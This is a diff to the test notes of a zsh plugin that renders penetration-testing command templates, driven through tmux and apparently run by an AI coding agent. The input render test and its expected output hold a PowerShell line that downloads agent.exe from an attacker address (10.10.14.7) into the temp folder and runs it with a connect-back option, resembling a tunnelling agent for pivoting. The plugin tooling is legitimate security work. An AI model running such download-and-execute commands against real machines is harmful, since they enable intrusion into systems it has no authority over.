@@ -179,8 +179,8 @@ Expected buffer:
 
 ## Input Render Test
 
-This verifies that `ii p -input` renders lowercase variables, leaves uppercase
-and PowerShell scope variables unchanged, stops at `EOF`, and copies only the
+This verifies that `ii p --input` renders lowercase variables, leaves uppercase
+and PowerShell scope variables unchanged, stops at `.`, and copies only the
 rendered body when `--copy` is used.
 
 ```zsh
@@ -190,12 +190,12 @@ tmux send-keys -t codex-ii-input "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kal
 tmux send-keys -t codex-ii-input "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-input "ii s lhost 10.10.14.7" Enter
 tmux send-keys -t codex-ii-input "file=/tmp/drop/agent.exe" Enter
-tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p -input --copy" Enter
+tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p --input --copy" Enter
 tmux send-keys -t codex-ii-input '$KALI = "$lhost"' Enter
 tmux send-keys -t codex-ii-input '$FILE = "${file:t}"' Enter
 tmux send-keys -t codex-ii-input 'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' Enter
 tmux send-keys -t codex-ii-input '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' Enter
-tmux send-keys -t codex-ii-input 'EOF' Enter
+tmux send-keys -t codex-ii-input '.' Enter
 sleep 2
 tmux capture-pane -t codex-ii-input -p -S -120
 tmux show-buffer
@@ -209,6 +209,28 @@ $KALI = "10.10.14.7"
 $FILE = "agent.exe"
 Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
 & "$env:TEMP\$FILE" --connect :11601 -selfcert
+```
+
+## Payload Output Path Test
+
+This verifies rendered payload output path resolution.
+
+```zsh
+zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ""'
+zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path filename'
+zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./'
+zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path ./payload.txt'
+zsh -fc 'source ./ii.plugin.zsh; ii_payload_output_path /tmp/payload.txt'
+```
+
+Expected output:
+
+```text
+/www/p/att.txt
+/www/filename
+./att.txt
+./payload.txt
+/tmp/payload.txt
 ```
 
 ## OSC52 Sequence Test
